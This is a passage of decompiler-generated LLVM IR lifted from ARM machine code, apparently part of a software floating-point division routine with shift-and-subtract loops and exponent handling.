  %v3_1aac813.ph = phi i32 [ %v3_1aac8, %dec_label_pc_1aadc ], [ 0, %dec_label_pc_1aa2c ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1aadc ], [ 1048576, %dec_label_pc_1aa2c ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1aadc ], [ 524288, %dec_label_pc_1aa2c ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1aa44

dec_label_pc_1aa44:                               ; preds = %dec_label_pc_1aa44.outer, %dec_label_pc_1aab4
  %v1_1aaa859 = phi i32 [ %v2_1aaf0, %dec_label_pc_1aab4 ], [ %storemerge133, %dec_label_pc_1aa44.outer ]
  %v1_1aa54 = phi i32 [ %v1_1aa5432, %dec_label_pc_1aab4 ], [ %storemerge133, %dec_label_pc_1aa44.outer ]
  %v1_1aa7041 = phi i32 [ %v1_1aa7043, %dec_label_pc_1aab4 ], [ %storemerge133, %dec_label_pc_1aa44.outer ]
  %v1_1aa8c50 = phi i32 [ %v1_1aa8c52, %dec_label_pc_1aab4 ], [ %storemerge133, %dec_label_pc_1aa44.outer ]
  %v0_1aacc = phi i32 [ %v3_1aacc, %dec_label_pc_1aab4 ], [ %storemerge, %dec_label_pc_1aa44.outer ]
  %v0_1aa48 = phi i32 [ %v5_1aab8, %dec_label_pc_1aab4 ], [ %v0_1aa48.ph, %dec_label_pc_1aa44.outer ]
  %v1_1aa4c = phi i32 [ %v3_1aabc, %dec_label_pc_1aab4 ], [ %v1_1aa4c.ph, %dec_label_pc_1aa44.outer ]
  %v5_1aac417 = phi i32 [ %v5_1aac4, %dec_label_pc_1aab4 ], [ %v5_1aac417.ph, %dec_label_pc_1aa44.outer ]
  %v3_1aac813 = phi i32 [ %v3_1aac8, %dec_label_pc_1aab4 ], [ %v3_1aac813.ph, %dec_label_pc_1aa44.outer ]
  %v3_1aa44 = icmp uge i32 %v1_1aa4c, %v3_1aac813
  %v3_1aa48 = icmp eq i1 %v3_1aa44, false
  %v4_1aa48 = sub i32 %v0_1aa48, %v5_1aac417
  %v6_1aa48 = sext i1 %v3_1aa48 to i32
  %v7_1aa48 = add i32 %v6_1aa48, %v4_1aa48
  %v8_1aa48 = zext i1 %v3_1aa48 to i32
  %v9_1aa48 = sub i32 %v7_1aa48, %v8_1aa48
  %v10_1aa48 = icmp ult i32 %v0_1aa48, %v9_1aa48
  %v11_1aa48 = icmp ne i32 %v5_1aac417, -1
  %v12_1aa48 = or i1 %v11_1aa48, %v10_1aa48
  %v13_1aa48 = icmp ult i32 %v0_1aa48, %v5_1aac417
  %v14_1aa48 = select i1 %v3_1aa48, i1 %v12_1aa48, i1 %v13_1aa48
  br i1 %v14_1aa48, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1aa44
  %v3_1aa4c = sub i32 %v1_1aa4c, %v3_1aac813
  store i32 %v3_1aa4c, i32* %r6.global-to-local, align 4
  store i32 %v7_1aa48, i32* %r5.global-to-local, align 4
  %v3_1aa54 = or i32 %v1_1aa54, %v0_1aacc
  store i32 %v3_1aa54, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1aa44, %bb96
  %v1_1aaa858 = phi i32 [ %v1_1aaa859, %dec_label_pc_1aa44 ], [ %v3_1aa54, %bb96 ]
  %v1_1aa5435 = phi i32 [ %v1_1aa54, %dec_label_pc_1aa44 ], [ %v3_1aa54, %bb96 ]
  %v1_1aa70 = phi i32 [ %v1_1aa7041, %dec_label_pc_1aa44 ], [ %v3_1aa54, %bb96 ]
  %v1_1aa8c49 = phi i32 [ %v1_1aa8c50, %dec_label_pc_1aa44 ], [ %v3_1aa54, %bb96 ]
  %v0_1aa64 = phi i32 [ %v0_1aa48, %dec_label_pc_1aa44 ], [ %v7_1aa48, %bb96 ]
  %v1_1aa68 = phi i32 [ %v1_1aa4c, %dec_label_pc_1aa44 ], [ %v3_1aa4c, %bb96 ]
  %v1_1aa58 = urem i32 %v5_1aac417, 2
  %v2_1aa58 = icmp ne i32 %v1_1aa58, 0
  %v3_1aa58 = udiv i32 %v5_1aac417, 2
  %v3_1aa5c = zext i1 %v2_1aa58 to i32
  %v6_1aa5c = zext i32 %v3_1aac813 to i64
  %v7_1aa5c = sub i32 33, %v3_1aac813
  %v8_1aa5c = zext i32 %v7_1aa5c to i64
  %v9_1aa5c = shl i64 %v6_1aa5c, %v8_1aa5c
  %v10_1aa5c = sub i32 32, %v3_1aac813
  %v11_1aa5c = shl i32 %v3_1aa5c, %v10_1aa5c
  %v12_1aa5c = zext i32 %v11_1aa5c to i64
  %v14_1aa5c = or i64 %v12_1aa5c, %v9_1aa5c
  %v15_1aa5c = trunc i64 %v14_1aa5c to i32
  %v3_1aa60 = icmp uge i32 %v1_1aa68, %v15_1aa5c
  %v3_1aa64 = icmp eq i1 %v3_1aa60, false
  %v4_1aa64 = sub i32 %v0_1aa64, %v3_1aa58
  %v6_1aa64 = sext i1 %v3_1aa64 to i32
  %v7_1aa64 = add i32 %v6_1aa64, %v4_1aa64
  %v13_1aa64 = icmp ult i32 %v0_1aa64, %v3_1aa58
  %v14_1aa64 = or i1 %v13_1aa64, %v3_1aa64
  br i1 %v14_1aa64, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1aa68 = sub i32 %v1_1aa68, %v15_1aa5c
  store i32 %v3_1aa68, i32* %r6.global-to-local, align 4
  store i32 %v7_1aa64, i32* %r5.global-to-local, align 4
  %v5_1aa70 = udiv i32 %v0_1aacc, 2
  %v6_1aa70 = or i32 %v1_1aa70, %v5_1aa70
  store i32 %v6_1aa70, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1aaa857 = phi i32 [ %v1_1aaa858, %.thread4 ], [ %v6_1aa70, %bb97 ]
  %v1_1aa5434 = phi i32 [ %v1_1aa5435, %.thread4 ], [ %v6_1aa70, %bb97 ]
  %v1_1aa7045 = phi i32 [ %v1_1aa70, %.thread4 ], [ %v6_1aa70, %bb97 ]
  %v1_1aa8c = phi i32 [ %v1_1aa8c49, %.thread4 ], [ %v6_1aa70, %bb97 ]
  %v0_1aa80 = phi i32 [ %v0_1aa64, %.thread4 ], [ %v7_1aa64, %bb97 ]
  %v1_1aa84 = phi i32 [ %v1_1aa68, %.thread4 ], [ %v3_1aa68, %bb97 ]
  %v1_1aa74 = urem i32 %v3_1aa58, 2
  %v2_1aa74 = icmp ne i32 %v1_1aa74, 0
  %v3_1aa74 = udiv i32 %v5_1aac417, 4
  %v3_1aa78 = zext i1 %v2_1aa74 to i32
  %v6_1aa78 = and i64 %v14_1aa5c, 4294967295
  %v7_1aa78 = sub i32 33, %v15_1aa5c
  %v8_1aa78 = zext i32 %v7_1aa78 to i64
  %v9_1aa78 = shl i64 %v6_1aa78, %v8_1aa78
  %v10_1aa78 = sub i32 32, %v15_1aa5c
  %v11_1aa78 = shl i32 %v3_1aa78, %v10_1aa78
  %v12_1aa78 = zext i32 %v11_1aa78 to i64
  %v14_1aa78 = or i64 %v12_1aa78, %v9_1aa78
  %v15_1aa78 = trunc i64 %v14_1aa78 to i32
  %v3_1aa7c = icmp uge i32 %v1_1aa84, %v15_1aa78
  %v3_1aa80 = icmp eq i1 %v3_1aa7c, false
  %v4_1aa80 = sub i32 %v0_1aa80, %v3_1aa74
  %v6_1aa80 = sext i1 %v3_1aa80 to i32
  %v7_1aa80 = add i32 %v6_1aa80, %v4_1aa80
  %v13_1aa80 = icmp ult i32 %v0_1aa80, %v3_1aa74
  %v14_1aa80 = or i1 %v13_1aa80, %v3_1aa80
  br i1 %v14_1aa80, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1aa84 = sub i32 %v1_1aa84, %v15_1aa78
  store i32 %v3_1aa84, i32* %r6.global-to-local, align 4
  store i32 %v7_1aa80, i32* %r5.global-to-local, align 4
  %v5_1aa8c = udiv i32 %v0_1aacc, 4
  %v6_1aa8c = or i32 %v1_1aa8c, %v5_1aa8c
  store i32 %v6_1aa8c, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1aaa8 = phi i32 [ %v1_1aaa857, %.thread6 ], [ %v6_1aa8c, %bb98 ]
  %v1_1aa5433 = phi i32 [ %v1_1aa5434, %.thread6 ], [ %v6_1aa8c, %bb98 ]
  %v1_1aa7044 = phi i32 [ %v1_1aa7045, %.thread6 ], [ %v6_1aa8c, %bb98 ]
  %v1_1aa8c53 = phi i32 [ %v1_1aa8c, %.thread6 ], [ %v6_1aa8c, %bb98 ]
  %v0_1aa9c = phi i32 [ %v0_1aa80, %.thread6 ], [ %v7_1aa80, %bb98 ]
  %v1_1aaa0 = phi i32 [ %v1_1aa84, %.thread6 ], [ %v3_1aa84, %bb98 ]
  %v1_1aa90 = urem i32 %v3_1aa74, 2
  %v2_1aa90 = icmp ne i32 %v1_1aa90, 0
  %v3_1aa90 = udiv i32 %v5_1aac417, 8
  %v3_1aa94 = zext i1 %v2_1aa90 to i32
  %v6_1aa94 = and i64 %v14_1aa78, 4294967295
  %v7_1aa94 = sub i32 33, %v15_1aa78
  %v8_1aa94 = zext i32 %v7_1aa94 to i64
  %v9_1aa94 = shl i64 %v6_1aa94, %v8_1aa94
  %v10_1aa94 = sub i32 32, %v15_1aa78
  %v11_1aa94 = shl i32 %v3_1aa94, %v10_1aa94
  %v12_1aa94 = zext i32 %v11_1aa94 to i64
  %v14_1aa94 = or i64 %v12_1aa94, %v9_1aa94
  %v15_1aa94 = trunc i64 %v14_1aa94 to i32
  %v3_1aa98 = icmp uge i32 %v1_1aaa0, %v15_1aa94
  %v3_1aa9c = icmp eq i1 %v3_1aa98, false
  %v4_1aa9c = sub i32 %v0_1aa9c, %v3_1aa90
  %v6_1aa9c = sext i1 %v3_1aa9c to i32
  %v7_1aa9c = add i32 %v6_1aa9c, %v4_1aa9c
  %v13_1aa9c = icmp ult i32 %v0_1aa9c, %v3_1aa90
  %v14_1aa9c = or i1 %v13_1aa9c, %v3_1aa9c
  br i1 %v14_1aa9c, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1aaa0 = sub i32 %v1_1aaa0, %v15_1aa94
  store i32 %v3_1aaa0, i32* %r6.global-to-local, align 4
  store i32 %v7_1aa9c, i32* %r5.global-to-local, align 4
  %v5_1aaa8 = udiv i32 %v0_1aacc, 8
  %v6_1aaa8 = or i32 %v1_1aaa8, %v5_1aaa8
  store i32 %v6_1aaa8, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1aab8 = phi i32 [ %v1_1aaa0, %.thread8 ], [ %v3_1aaa0, %bb100 ]
  %v0_1aab4 = phi i32 [ %v0_1aa9c, %.thread8 ], [ %v7_1aa9c, %bb100 ]
  %v2_1aaf0 = phi i32 [ %v1_1aaa8, %.thread8 ], [ %v6_1aaa8, %bb100 ]
  %v1_1aa5432 = phi i32 [ %v1_1aa5433, %.thread8 ], [ %v6_1aaa8, %bb100 ]
  %v1_1aa7043 = phi i32 [ %v1_1aa7044, %.thread8 ], [ %v6_1aaa8, %bb100 ]
  %v1_1aa8c52 = phi i32 [ %v1_1aa8c53, %.thread8 ], [ %v6_1aaa8, %bb100 ]
  %v2_1aaac = or i32 %v0_1aab4, %v1_1aab8
  %v4_1aaac = icmp eq i32 %v2_1aaac, 0
  br i1 %v4_1aaac, label %dec_label_pc_1aaec, label %dec_label_pc_1aab4

dec_label_pc_1aab4:                               ; preds = %.thread10
  %v3_1aab4 = mul i32 %v0_1aab4, 16
  %v4_1aab8 = udiv i32 %v1_1aab8, 268435456
  %v5_1aab8 = or i32 %v3_1aab4, %v4_1aab8
  store i32 %v5_1aab8, i32* %r5.global-to-local, align 4
  %v3_1aabc = mul i32 %v1_1aab8, 16
  store i32 %v3_1aabc, i32* %r6.global-to-local, align 4
  %v3_1aac0 = mul nuw i32 %v3_1aa90, 8
  %v4_1aac4 = udiv i32 %v15_1aa94, 536870912
  %v5_1aac4 = or i32 %v4_1aac4, %v3_1aac0
  %v3_1aac8 = mul i32 %v15_1aa94, 8
  %v3_1aacc = udiv i32 %v0_1aacc, 16
  store i32 %v3_1aacc, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1aacc, 16
  br i1 %tmp, label %dec_label_pc_1aad4, label %dec_label_pc_1aa44

dec_label_pc_1aad4:                               ; preds = %dec_label_pc_1aab4
  %v1_1aad4 = and i32 %v1_1aaf0.ph, 1048576
  %v2_1aad4 = icmp eq i32 %v1_1aad4, 0
  br i1 %v2_1aad4, label %dec_label_pc_1aadc, label %.thread11.loopexit

dec_label_pc_1aadc:                               ; preds = %dec_label_pc_1aad4
  %v2_1aadc = or i32 %v2_1aaf0, %v1_1aaf0.ph
  store i32 %v2_1aadc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aa44.outer

dec_label_pc_1aaec:                               ; preds = %.thread10
  store i32 %v15_1aa94, i32* %r2.global-to-local, align 4
  store i32 %v3_1aa90, i32* %r3.global-to-local, align 4
  %v1_1aaec = and i32 %v1_1aaf0.ph, 1048576
  %v2_1aaec = icmp eq i32 %v1_1aaec, 0
  br i1 %v2_1aaec, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1aaec
  %v3_1aaf0 = or i32 %v2_1aaf0, %v1_1aaf0.ph
  store i32 %v3_1aaf0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1aad4
  store i32 %v3_1aac8, i32* %r2.global-to-local, align 4
  store i32 %v5_1aac4, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1aaec, %bb101
  %v1_1aaf8 = add nsw i32 %v4_1aa18, 515
  store i32 %v1_1aaf8, i32* %ip.global-to-local, align 4
  %v2_1aaf8 = icmp ugt i32 %v1_1aa1c, 252
  %v7_1aaf8 = icmp eq i32 %v1_1aa1c, 253
  %v2_1aafc = xor i1 %v7_1aaf8, true
  %v3_1aafc = and i1 %v2_1aaf8, %v2_1aafc
  br i1 %v3_1aafc, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1aafc = icmp ugt i32 %v1_1aaf8, 1791
  %v11_1aafc = icmp eq i32 %v1_1aaf8, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1ab00 = phi i1 [ %v7_1aaf8, %.thread11 ], [ %v11_1aafc, %bb102 ]
  %v0_1ab00 = phi i1 [ %v2_1aaf8, %.thread11 ], [ %v6_1aafc, %bb102 ]
  %v2_1ab00 = xor i1 %v1_1ab00, true
  %v3_1ab00 = and i1 %v0_1ab00, %v2_1ab00
  call void @__pseudo_cond_branch(i1 %v3_1ab00, i32 ptrtoint (i32* @global_var_1a814.986 to i32))
  %v0_1ab04 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ab04 = load i32, i32* %r3.global-to-local, align 4
  %v2_1ab04 = sub i32 %v0_1ab04, %v1_1ab04
  store i32 %v2_1ab04, i32* %ip.global-to-local, align 4
  %v3_1ab04 = icmp uge i32 %v0_1ab04, %v1_1ab04
  %v9_1ab04 = icmp eq i32 %v0_1ab04, %v1_1ab04
  br i1 %v9_1ab04, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1ab08 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ab08 = load i32, i32* %r2.global-to-local, align 4
  %v3_1ab08 = sub i32 %v1_1ab08, %v2_1ab08
  store i32 %v3_1ab08, i32* %ip.global-to-local, align 4
  %v4_1ab08 = icmp uge i32 %v1_1ab08, %v2_1ab08
  %v10_1ab08 = icmp eq i32 %v1_1ab08, %v2_1ab08
  br i1 %v10_1ab08, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1ab0c = load i32, i32* %r0.global-to-local, align 4
  %v2_1ab0c = urem i32 %v1_1ab0c, 2
  %v3_1ab0c = icmp ne i32 %v2_1ab0c, 0
  %v4_1ab0c = udiv i32 %v1_1ab0c, 2
  store i32 %v4_1ab0c, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1ab10 = phi i1 [ %v3_1ab04, %bb103 ], [ %v4_1ab08, %bb104 ], [ %v3_1ab0c, %bb105 ]
  %v0_1ab10 = load i32, i32* %r0.global-to-local, align 4
  %v2_1ab10 = zext i1 %v1_1ab10 to i32
  %v3_1ab10 = add i32 %v2_1ab10, %v0_1ab10
  store i32 %v3_1ab10, i32* %r0.global-to-local, align 4
  %v0_1ab14 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ab14 = load i32, i32* %r4.global-to-local, align 4
  %v2_1ab14 = and i32 %v1_1ab14, 4096
  %v3_1ab14 = icmp ne i32 %v2_1ab14, 0
  %v4_1ab14 = mul i32 %v1_1ab14, 1048576
  %v6_1ab14 = add i32 %v4_1ab14, %v0_1ab14
  %v7_1ab14 = zext i1 %v3_1ab14 to i32
  %v8_1ab14 = add i32 %v7_1ab14, %v6_1ab14
  store i32 %v8_1ab14, i32* %r1.global-to-local, align 4
  %v2_1ab18 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1ab18, i32* %r4.global-to-local, align 4
  store i32 %v6_1a9b8, i32* %r5.global-to-local, align 4
  store i32 %v9_1a9b8, i32* %r6.global-to-local, align 4
  ret i32 %v3_1ab10

dec_label_pc_1ab20:                               ; preds = %dec_label_pc_1a9d8
  %v1_1ab20 = and i32 %v2_1a9dc, -2147483648
  %v4_1ab24 = urem i32 %v1_1a9c4, 1048576
  %v5_1ab24 = or i32 %v1_1ab20, %v4_1ab24
  store i32 %v5_1ab24, i32* %r1.global-to-local, align 4
  %v6_1ab28 = add nsw i32 %v2_1a9d8, 1023
  store i32 %v6_1ab28, i32* %r4.global-to-local, align 4
  %v8_1ab28 = sub nsw i32 0, %v2_1a9d8
  %v9_1ab28 = and i32 %v6_1ab28, %v8_1ab28
  %v11_1ab28 = icmp slt i32 %v2_1a9d8, -1023
  %v12_1ab28 = icmp eq i32 %v6_1ab28, 0
  %v7_1ab2c = icmp sgt i32 %v2_1a9d8, -1023
  br i1 %v7_1ab2c, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1ab20
  %v10_1ab2c = sub nsw i32 1024, %v2_1a9d8
  store i32 %v10_1ab2c, i32* %r5.global-to-local, align 4
  %v14_1ab2c = and i32 %v10_1ab2c, %v6_1ab28
  %v16_1ab2c = icmp slt i32 %v10_1ab2c, 0
  %v17_1ab2c = icmp eq i32 %v6_1ab28, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1ab20, %bb106
  %v3_1ab38.in = phi i32 [ %v9_1ab28, %dec_label_pc_1ab20 ], [ %v14_1ab2c, %bb106 ]
  %v2_1ab38 = phi i1 [ %v11_1ab28, %dec_label_pc_1ab20 ], [ %v16_1ab2c, %bb106 ]
  %v1_1ab38 = phi i1 [ %v12_1ab28, %dec_label_pc_1ab20 ], [ %v17_1ab2c, %bb106 ]
  %v3_1ab38 = icmp slt i32 %v3_1ab38.in, 0
  %v3_1ab30 = xor i1 %v3_1ab38, %v2_1ab38
  %v4_1ab30 = or i1 %v1_1ab38, %v3_1ab30
  br i1 %v4_1ab30, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1ab3084 = mul i32 %v6_1ab28, 1048576
  %v10_1ab3085 = or i32 %v9_1ab3084, %v5_1ab24
  store i32 %v10_1ab3085, i32* %r1.global-to-local, align 4
  store i32 %v3_1a9b8, i32* %r4.global-to-local, align 4
  store i32 %v6_1a9b8, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1ab38 = phi i32 [ %v12_1a9b8, %bb108 ], [ %v1_1ab20, %bb107 ]
  %v6_1ab38 = xor i1 %v4_1ab30, true
  call void @__pseudo_cond_branch(i1 %v6_1ab38, i32 %v0_1ab38)
  %v0_1ab3c = load i32, i32* %r1.global-to-local, align 4
  %v1_1ab3c = or i32 %v0_1ab3c, 1048576
  store i32 %v1_1ab3c, i32* @r1, align 4
  %v0_1ab44 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ab44 = add i32 %v0_1ab44, -1
  store i32 %v1_1ab44, i32* @r4, align 4
  %v3_1ab44 = sub i32 0, %v0_1ab44
  %v4_1ab44 = and i32 %v0_1ab44, %v3_1ab44
  %v5_1ab44 = icmp slt i32 %v4_1ab44, 0
  store i1 %v5_1ab44, i1* @cpsr_v, align 1
  %v6_1ab44 = icmp slt i32 %v1_1ab44, 0
  store i1 %v6_1ab44, i1* @cpsr_n, align 1
  %v7_1ab44 = icmp eq i32 %v0_1ab44, 1
  store i1 %v7_1ab44, i1* @cpsr_z, align 1
  %v0_1ab48 = call i32 @function_1a814()
  store i32 %v0_1ab48, i32* @r0, align 4
  %v0_1ab50 = call i32 @function_1a814()
  store i32 %v0_1ab50, i32* @r0, align 4
  %v0_1ab54.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1ab58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ab54

dec_label_pc_1ab54:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1ab54.pre-phi = phi i32 [ %v5_1a9c8, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1a9c8, %bb91 ], [ %v5_1a9c8, %.thread ]
  %v0_1ab58 = phi i32 [ %v5_1a9c4, %.thread1 ], [ %v5_1a9c4, %.thread2 ], [ %v5_1a9c4, %bb91 ], [ %v0_1ab58.pre, %.thread ]
  %v2_1ab5c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1ab54.pre, %.thread ]
  %v5_1ab54 = and i32 %v2_1ab5c, %v4_1ab54.pre-phi
  store i32 %v5_1ab54, i32* @r5, align 4
  %v4_1ab58 = icmp eq i32 %v2_1ab5c, %v0_1ab58
  br i1 %v4_1ab58, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1ab54
  %v5_1ab5c = icmp eq i32 %v5_1ab54, %v2_1ab5c
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1ab54, %bb109
  %v0_1ab60 = phi i1 [ false, %dec_label_pc_1ab54 ], [ %v5_1ab5c, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1ab60, i32 ptrtoint (i32* @global_var_1a9a8.988 to i32))
  %v0_1ab64 = load i32, i32* @r4, align 4
  %v1_1ab64 = load i32, i32* %ip.global-to-local, align 4
  %v4_1ab64 = icmp eq i32 %v1_1ab64, %v0_1ab64
  br i1 %v4_1ab64, label %dec_label_pc_1ab6c, label %dec_label_pc_1ab88

dec_label_pc_1ab6c:                               ; preds = %bb110
  %v0_1ab6c = load i32, i32* @r0, align 4
  %v1_1ab6c = load i32, i32* @r1, align 4
  %v4_1ab6c = mul i32 %v1_1ab6c, 4096
  %v5_1ab6c = or i32 %v4_1ab6c, %v0_1ab6c
  store i32 %v5_1ab6c, i32* %r4.global-to-local, align 4
  %v1_1ab70 = icmp ne i32 %v5_1ab6c, 0
  call void @__pseudo_cond_branch(i1 %v1_1ab70, i32 ptrtoint (i32* @global_var_1a9a8.988 to i32))
  %v0_1ab74 = load i32, i32* @r5, align 4
  %v1_1ab74 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ab78 = icmp ne i32 %v1_1ab74, %v0_1ab74
  call void @__pseudo_cond_branch(i1 %v1_1ab78, i32 ptrtoint (i32* @global_var_1a98c.989 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1ab84 = call i32 @function_1a9a8(i32 %arg3, i32 %arg4)
  store i32 %v2_1ab84, i32* @r0, align 4
  %v1_1ab88.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1ab88

dec_label_pc_1ab88:                               ; preds = %bb110, %dec_label_pc_1ab6c
  %v1_1ab88 = phi i32 [ %v1_1ab64, %bb110 ], [ %v1_1ab88.pre, %dec_label_pc_1ab6c ]
  %v0_1ab88 = load i32, i32* @r5, align 4
  %v4_1ab88 = icmp eq i32 %v0_1ab88, %v1_1ab88
  br i1 %v4_1ab88, label %dec_label_pc_1ab90, label %dec_label_pc_1ab88.dec_label_pc_1aba4_crit_edge

dec_label_pc_1ab88.dec_label_pc_1aba4_crit_edge:  ; preds = %dec_label_pc_1ab88
  %v0_1aba4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1aba4

dec_label_pc_1ab90:                               ; preds = %dec_label_pc_1ab88
  %v4_1ab90 = mul i32 %arg4, 4096
  %v5_1ab90 = or i32 %v4_1ab90, %arg3
  store i32 %v5_1ab90, i32* %r5.global-to-local, align 4
  %v7_1ab90 = icmp eq i32 %v5_1ab90, 0
  call void @__pseudo_cond_branch(i1 %v7_1ab90, i32 ptrtoint (i32* @global_var_1a93c.990 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1aba0 = call i32 @function_1a9a8(i32 %arg3, i32 %arg4)
  store i32 %v2_1aba0, i32* @r0, align 4
  br label %dec_label_pc_1aba4

dec_label_pc_1aba4:                               ; preds = %dec_label_pc_1ab88.dec_label_pc_1aba4_crit_edge, %dec_label_pc_1ab90
  %v0_1aba4 = phi i32 [ %v0_1aba4.pre, %dec_label_pc_1ab88.dec_label_pc_1aba4_crit_edge ], [ %v2_1aba0, %dec_label_pc_1ab90 ]
  %v1_1aba4 = load i32, i32* @r1, align 4
  %v3_1aba4 = mul i32 %v1_1aba4, 2
  %v4_1aba4 = or i32 %v3_1aba4, %v0_1aba4
  store i32 %v4_1aba4, i32* %r6.global-to-local, align 4
  %v6_1aba4 = icmp eq i32 %v4_1aba4, 0
  br i1 %v6_1aba4, label %dec_label_pc_1aba4._crit_edge, label %bb111

dec_label_pc_1aba4._crit_edge:                    ; preds = %dec_label_pc_1aba4
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1aba4
  %v4_1aba8 = mul i32 %arg4, 2
  %v5_1aba8 = or i32 %v4_1aba8, %arg3
  store i32 %v5_1aba8, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1aba8, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1aba4._crit_edge, %bb111
  %v4_1abb8.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1aba4._crit_edge ], [ %v5_1aba8, %bb111 ]
  %v0_1abac = phi i1 [ false, %dec_label_pc_1aba4._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1abac, i32 ptrtoint (i32* @global_var_1a8d4.991 to i32))
  %v0_1abb0 = load i32, i32* @r0, align 4
  %v1_1abb0 = load i32, i32* @r1, align 4
  %v3_1abb0 = mul i32 %v1_1abb0, 2
  %v4_1abb0 = or i32 %v3_1abb0, %v0_1abb0
  store i32 %v4_1abb0, i32* %r4.global-to-local, align 4
  %v1_1abb4 = icmp ne i32 %v4_1abb0, 0
  call void @__pseudo_cond_branch(i1 %v1_1abb4, i32 ptrtoint (i32* @global_var_1a98c.989 to i32))
  store i32 %v4_1abb8.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1abbc = icmp ne i32 %v4_1abb8.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1abbc, i32 ptrtoint (i32* @global_var_1a93c.990 to i32))
  %v0_1abc0 = load i32, i32* @r0, align 4
  %v1_1abc0 = load i32, i32* @r1, align 4
  %v2_1abc0 = call i32 @function_1a9a8(i32 %v0_1abc0, i32 %v1_1abc0)
  store i32 %v2_1abc0, i32* %r0.global-to-local, align 4
  ret i32 %v2_1abc0

; uselistorder directives
  uselistorder i32 %v5_1aba8, { 1, 0, 2 }
  uselistorder i32 %v1_1ab64, { 1, 0 }
  uselistorder i32 %v1_1ab44, { 1, 0 }
  uselistorder i32 %v0_1ab44, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1ab2c, { 2, 0, 1 }
  uselistorder i32 %v6_1ab28, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1ab20, { 1, 0 }
  uselistorder i32 %v2_1ab08, { 1, 0, 2 }
  uselistorder i32 %v1_1ab08, { 1, 0, 2 }
  uselistorder i32 %v1_1ab04, { 1, 0, 2 }
  uselistorder i32 %v0_1ab04, { 1, 0, 2 }
  uselistorder i1 %v7_1aaf8, { 1, 0 }
  uselistorder i32 %v2_1aadc, { 1, 0 }
  uselistorder i32 %v3_1aac8, { 2, 1, 0 }
  uselistorder i32 %v3_1aabc, { 0, 2, 1 }
  uselistorder i32 %v5_1aab8, { 2, 0, 1 }
  uselistorder i32 %v6_1aaa8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1aa94, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1aa90, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1aa9c, { 0, 2, 1 }
  uselistorder i32 %v1_1aaa8, { 1, 0 }
  uselistorder i32 %v6_1aa8c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1aa78, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1aa74, { 0, 2, 1 }
  uselistorder i32 %v0_1aa80, { 0, 2, 1 }
  uselistorder i32 %v1_1aa8c, { 1, 0 }
  uselistorder i32 %v6_1aa70, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1aa5c, { 1, 2, 0, 3 }
